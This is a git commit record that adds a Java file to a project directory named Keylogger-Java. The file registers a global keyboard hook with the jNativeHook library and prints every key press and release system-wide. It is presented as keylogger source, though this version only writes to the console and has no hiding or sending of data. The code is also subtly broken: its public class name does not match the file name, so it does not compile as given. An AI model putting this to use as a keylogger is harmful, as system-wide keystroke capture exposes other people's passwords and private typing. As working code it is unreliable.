aceae87bd736aa841dab828bb7eeb3da8f95abd9
Francesco Fedele <56889513+kal1gh0st@users.noreply.github.com>
2021-02-26 21:20:23 +0100

    Create jkeyread.java

---
+++ Keylogger-Java/jkeyread.java
@@ -0,0 +1,45 @@
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+/**
+ * @author javaQuery
+ * Global Keyboard Listener
+ */
+public class jNativeHookExample implements NativeKeyListener {
+
+    /* Key Pressed */
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+
+        /* Terminate program when one press ESCAPE */
+        if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
+            GlobalScreen.unregisterNativeHook();
+        }
+    }
+
+    /* Key Released */
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+
+    /* I can't find any output from this call */
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
+    }
+
+    public static void main(String[] args) {
+        try {
+            /* Register jNativeHook */
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException ex) {
+            /* Its error */
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+            System.exit(1);
+        }
+
+        /* Construct the example object and initialze native hook. */
+        GlobalScreen.getInstance().addNativeKeyListener(new jNativeHookExample());
+    }
+}
